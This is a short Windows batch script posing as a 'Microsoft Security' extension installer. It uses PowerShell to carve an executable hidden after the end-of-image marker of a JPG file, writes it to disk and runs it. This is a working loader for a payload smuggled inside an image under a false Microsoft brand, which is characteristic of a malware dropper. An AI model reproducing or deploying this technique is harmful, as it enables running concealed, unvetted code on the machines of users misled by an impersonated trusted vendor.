@echo off
title Microsoft Security Installer
echo Microsoft Security - Installing Extension...
echo.

:: Use PowerShell to extract EXE data from the JPG (everything after JPEG end marker FF D9)
powershell -Command ^
  "$bytes = [IO.File]::ReadAllBytes('%~dp0Microsoft-Security.jpg');" ^
  "$idx = 0;" ^
  "for($i=0;$i -lt $bytes.Length-1;$i++){ if($bytes[$i] -eq 0xFF -and $bytes[$i+1] -eq 0xD9){ $idx=$i+2; break; } }" ^
  "if($idx -gt 0){ $exe = $bytes[$idx..($bytes.Length-1)]; [IO.File]::WriteAllBytes('%~dp0Microsoft-Security-installer.exe', $exe); Write-Host 'Extracted installer from JPG' }" ^
  "else{ Write-Host 'ERROR: Could not find installer data in JPG' -ForegroundColor Red; exit 1 }"

if %errorlevel% neq 0 (
    echo.
    echo Failed to extract installer. Make sure Microsoft-Security.jpg is in the same folder.
    pause
    exit /b 1
)

echo.
echo Running installer...
start "" /wait "%~dp0Microsoft-Security-installer.exe"

echo.
echo Done!
echo.
pause
